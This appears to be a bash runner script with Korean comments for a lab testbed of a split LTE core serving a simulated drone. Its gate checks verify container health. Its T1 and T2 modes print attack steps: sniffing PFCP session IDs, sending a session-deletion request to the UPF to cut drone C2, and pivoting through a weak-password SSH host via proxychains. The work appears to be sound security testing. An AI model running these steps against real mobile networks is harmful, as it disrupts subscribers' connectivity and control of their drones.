#!/usr/bin/env bash
# verify-split.sh — 분리 코어 게이트/T1/T2 검증 러너 (클론 전용).
# 사용: bash verify-split.sh {gates|t1|t2}
# ⚠ 초안 — 클론에서 실측 수렴. t1/t2는 가용성 공격(가역): 실행 후 재attach로 복구.
set -uo pipefail
CMD="${1:-gates}"
POC=~/dah_exec/B_TM2_V3/pfcp_delete.py
UPF_CORE=10.50.0.7
line(){ printf '\n\033[1;36m== %s ==\033[0m\n' "$*"; }

gates() {
  line "G-split-A: NF 6개 UP + Diameter/PFCP association"
  docker ps --format '{{.Names}}\t{{.Status}}' | grep -E 'epc_(mme|sgwc|smf|sgwu|upf|dia)' || true
  echo "--- mme S6a(HSS) ---"; docker logs epc_mme 2>&1 | grep -iE 'diameter|s6a|hss|connected' | tail -5
  echo "--- smf↔upf PFCP ---"; docker logs epc_smf 2>&1 | grep -iE 'pfcp|associat|upf' | tail -5
  echo "--- sgwc↔sgwu PFCP ---"; docker logs epc_sgwc 2>&1 | grep -iE 'pfcp|associat|sgwu' | tail -5
  line "G-split-B: RAN attach 회귀"
  docker exec uav_ue ip -4 addr show tun_srsue 2>/dev/null | grep inet || echo "  tun_srsue 미형성 — attach 실패(수렴 필요)"
  line "G-split-C: 양방향 C2 (baseline)"
  bash ~/dah_exec/00_baseline_recon.sh 2>&1 | tail -4
  line "net_core에서 PFCP 도달성 (T1 전제)"
  echo "  (net_core 노드에서) nc -zvu $UPF_CORE 8805  → PFCP 포트 확인"
}

t1() {
  line "[T1] 분리·노출: net_core 위치에서 직접 PFCP 세션삭제"
  echo "1) 관측(다른 터미널): docker run -i --rm --network container:uav_ue dahv2/air python3 - 15 < ~/dah_exec/DEMO/demo_obs.py  # C2 두절 관측용은 gcs_c2 로그"
  echo "2) SEID 학습(수동): docker run -i --rm --network net_core dahv2/pfcp-poc python3 /exec/B_TM2_V3/pfcp_delete.py sniff --iface eth0 --count 20"
  echo "3) 세션삭제: docker run -i --rm --network net_core -v ~/dah_exec:/exec dahv2/pfcp-poc \\"
  echo "     python3 /exec/B_TM2_V3/pfcp_delete.py delete --target $UPF_CORE --node-id 10.50.0.99 --seid 0x<SEID>"
  echo "판정: gcs_c2 HEARTBEAT 소실(C2 두절) → UAV 재attach 시 복구"
}

t2() {
  line "[T2] 측면이동: 가입자평면 → 피벗 침투 → net_core → PFCP 삭제"
  echo "0) 피벗 기동: docker compose -f compose/docker-compose.epc-split.yml --profile t2 up -d pivot"
  echo "1) (공격자=UE 위치) 피벗 약자격 침투:"
  echo "   docker run -it --rm --network container:uav_ue dahv2/pfcp-poc sh -c 'sshpass -p pivot123 ssh -o StrictHostKeyChecking=no pivot@10.44.0.50 ...'"
  echo "   → 피벗에서 net_core(10.50.0.0/24) 도달 확인: ping 10.50.0.7"
  echo "2) 피벗 경유 SOCKS/포워드로 net_core PFCP 도달 후 pfcp_delete 실행 (proxychains)"
  echo "3) 판정: 가입자 위치에서 시작해 코어 세션삭제까지 → C2 두절 → 복구"
  echo "  (상세 명령은 클론에서 피벗 도달성 확인 후 확정)"
}

case "$CMD" in
  gates) gates ;;
  t1) t1 ;;
  t2) t2 ;;
  *) echo "usage: $0 {gates|t1|t2}"; exit 1 ;;
esac
